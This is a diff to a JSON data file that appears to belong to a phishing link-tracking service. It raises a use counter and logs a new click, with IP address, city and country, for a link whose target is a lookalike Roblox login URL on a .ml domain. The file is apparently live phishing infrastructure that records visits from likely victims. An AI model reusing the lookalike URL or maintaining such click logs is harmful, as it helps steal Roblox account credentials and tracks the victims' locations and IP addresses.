@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 93,
+    "useCount": 94,
     "createdBy": "admin",
     "clicks": [
       {
@@ -856,6 +856,14 @@
         "city": "Manila",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776917824898,
+        "ip": "46.34.236.144",
+        "country": "Slovakia",
+        "city": "Nitra",
+        "flag": "🇸🇰",
+        "countryCode": "SK"
       }
     ]
   },
